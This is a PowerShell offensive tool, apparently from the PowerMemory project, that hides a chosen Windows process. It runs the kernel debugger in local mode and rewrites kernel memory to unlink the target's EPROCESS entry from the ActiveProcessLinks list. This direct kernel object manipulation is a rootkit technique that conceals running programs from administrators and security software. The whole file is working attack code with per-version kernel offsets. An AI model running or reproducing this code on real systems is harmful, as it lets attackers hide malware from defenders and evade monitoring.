<#
.SYNOPSIS 
    PowerProcess utility to hide a target process
    Author: Pierre-Alexandre Braeken
    Source: https://github.com/giMini/PowerMemory/
    License: BSD 3-Clause
    Small structures change by 3gstudent.
    
.DESCRIPTION 
This utility try to hide a target process.
This utility must be run with elevated permissions. 
We need the /debug mode switch to on (bcdedit.exe /debug on)

.EXAMPLE 
PS > Hide-Me -Process cmd.exe

Windows 7, 8, 10 supported (64 bits)

#>

#----------------------------------------------------------[Functions]-------------------------------------------------------------

function Get-OperatingSystemMode ($operatingSystem, $osArchitecture) {
    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
        $mode = 3
    }
    else {
        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
            if($osArchitecture -like "64*") {
                $mode = 1
            }
            else {
                $mode = 132
            }
        }
        else {
            if($operatingSystem -eq "6.2.9200"){
                $mode = 2
            }
            else{
                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){        
                    if($osArchitecture -like "64*") {  
                        if($operatingSystem -eq "6.3.9600"){
                            $mode = "8.1"       
                        }       
                        else {
                            $mode = "2r2"
                        }
                    }
                    else {
                        $mode = "232"
                    }
                }
                else {
                    if ($operatingSystem -eq "10.0.10514" -or $operatingSystem -eq "10.0.10586" -or $operatingSystem -eq "10.0.11082"){
                         $mode = "2016"
                    }
                    else {
                        if($operatingSystem -eq "10.0.14342" -or $operatingSystem -eq "10.0.14372" -or $operatingSystem -eq "10.0.14388") {
                             $mode = "1014342"
                        }
                        else {
                            Write-Output "The operating system could not be determined... terminating..."
                            Stop-Script
                        }
                    }
                }
            }
        }
    }
    return $mode
}

function Write-InFile ($buffer, $chain) {
    [io.file]::WriteAllText($buffer, $chain) | Out-Null
}

function Call-MemoryWalker ($kd, $file, $fullScriptPath, $symbols) {    
    $tab = &$kd -kl -y $symbols -c "`$`$<$fullScriptPath;Q"  
    return $tab
}

function Hide-Me {


[CmdletBinding()]
param (
    [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)]        
        [string] $Process
)

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

Set-StrictMode -version 2

$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = "." + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"

if((Test-Path test.txt) -eq 0)
{
    New-Item test.txt -type file
}
$buffer = "test.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$kd = ".\x64\kd.exe"
$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"

#----------------------------------------------------------[Execution]-------------------------------------------------------------

$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

$mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
$symfix = ""
Switch ($mode) {
    "1" { 
            $offset = "208"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = "0x188"
        }
    "132" { 
            $offset = "f8"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = ""
        }
    "2" { 
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
        }
    "8.1" {
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
            $protectedProcessOffset = "+0x67a" # Protection
            $protectProcess = "L1 0x61" # LSASS with protection 0x61
        }
    "2r2" {# to do
        }
    "232" {# to do
        }
    "2016" { 
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
        }
    "1014342" {
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
            $symfix = ".symfix
.reload /f nt"
    }
}

Write-Output "Trying to hide the process $Process"

$chain = "$symfix
!process 0 0 $Process"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"PROCESS") + 1
$processAddress = $tabFA[$fi]
Write-Output "$Process memory address found! ($processAddress)"

$chain = "$symfix
dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')   
$fi = [array]::indexof($tabFA,"[") + 1
$FLINK = $tabFA[$fi]

$fi = [array]::indexof($tabFA,"]") - 1
$BLINK = $tabFA[$fi]

$chain = "$symfix
dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName $processAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                 
$fi = [array]::indexof($tabFA,"_LIST_ENTRY") + 2
$thisProcessLinks = $tabFA[$fi]

# update flink of previous process to flink of target process
$chain = "$symfix
f $BLINK L4 0x$($FLINK.Substring(17,2)) 0x$($FLINK.Substring(15,2)) 0x$($FLINK.Substring(13,2)) 0x$($FLINK.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols
# Update blink of next process to blink of of target process
$chain = "$symfix
f $FLINK+0x8 L4 0x$($BLINK.Substring(17,2)) 0x$($BLINK.Substring(15,2)) 0x$($BLINK.Substring(13,2)) 0x$($BLINK.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

# update links of target process to itself
# it is necessary to get the links valid in case of API will use this links 
# (eg when process exits, the process manager removes it from the process list)
# if it is not done -> BSOD :-)
$chain = "$symfix
f $thisProcessLinks L4 0x$($thisProcessLinks.Substring(17,2)) 0x$($thisProcessLinks.Substring(15,2)) 0x$($thisProcessLinks.Substring(13,2)) 0x$($thisProcessLinks.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$chain = "$symfix
f $thisProcessLinks+0x8 L4 0x$($thisProcessLinks.Substring(17,2)) 0x$($thisProcessLinks.Substring(15,2)) 0x$($thisProcessLinks.Substring(13,2)) 0x$($thisProcessLinks.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

Write-Output "$Process is hidden"
}
